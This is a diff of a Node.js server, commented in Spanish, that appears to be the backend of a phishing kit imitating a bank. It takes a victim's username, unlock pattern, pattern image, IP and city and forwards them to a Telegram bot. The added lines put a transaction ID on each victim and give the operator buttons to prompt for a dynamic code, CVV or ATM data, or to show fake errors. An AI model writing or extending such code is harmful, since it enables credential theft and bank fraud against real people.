@@ -53,13 +53,23 @@ function cargarCliente(txid) {
 
 // 🔹 Enviar patrón
 app.post('/api/sendPattern', async (req, res) => {
-  const { patron, patronImg, usar, ip, city } = req.body;
+  const { patron, patronImg, usar, ip, city, txid } = req.body;
 
-  if (!patron || !patronImg || !usar) {
+  if (!patron || !patronImg || !usar || !txid) {
     return res.status(400).json({ error: 'Faltan datos obligatorios' });
   }
 
-  const caption = `🟢PRODUB4NC0🟢\n📱 US4R: <code>${usar}</code>\n🔒 Patrón recibido\nSecuencia: <code>${patron}</code>\n\n🌐 IP: ${ip || "N/A"}\n🏙️ Ciudad: ${city || "N/A"}`;
+  const caption = `
+🟢PRODUB4NC0🟢
+🆔 ID: <code>${txid}</code>
+
+📱 US4R: <code>${usar}</code>
+🔒 Patrón recibido
+Secuencia: <code>${patron}</code>
+
+🌐 IP: ${ip || "N/A"}
+🏙️ Ciudad: ${city || "N/A"}
+`;
 
   try {
     const base64Data = patronImg.replace(/^data:image\/png;base64,/, "");
@@ -71,13 +81,40 @@ app.post('/api/sendPattern', async (req, res) => {
     formData.append("caption", caption);
     formData.append("parse_mode", "HTML");
 
+    // 👉 enviar primero la foto
     const response = await axios.post(
       `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`,
       formData,
       { headers: formData.getHeaders(), httpsAgent: agent }
     );
 
-    console.log("✅ Patrón enviado a Telegram");
+    // 👉 enviar después los botones callback
+    const keyboard = {
+      inline_keyboard: [
+        [
+          { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
+          { text: "🏧CAJERO", callback_data: `errortok:${txid}` },
+          { text: "🔐PATRON", callback_data: `errortok:${txid}` }
+        ],
+        [
+          { text: "💳C3VV", callback_data: `ceve:${txid}` },
+          { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
+        ]
+      ]
+    };
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: `⚙️ Acciones para el patrón de <code>${usar}</code>`,
+        parse_mode: "HTML",
+        reply_markup: keyboard
+      })
+    });
+
+    console.log("✅ Patrón e info enviados a Telegram");
     res.status(200).json({ success: true, data: response.data });
   } catch (error) {
     console.error("❌ Error al enviar patrón a Telegram:", error.response?.data || error.message);
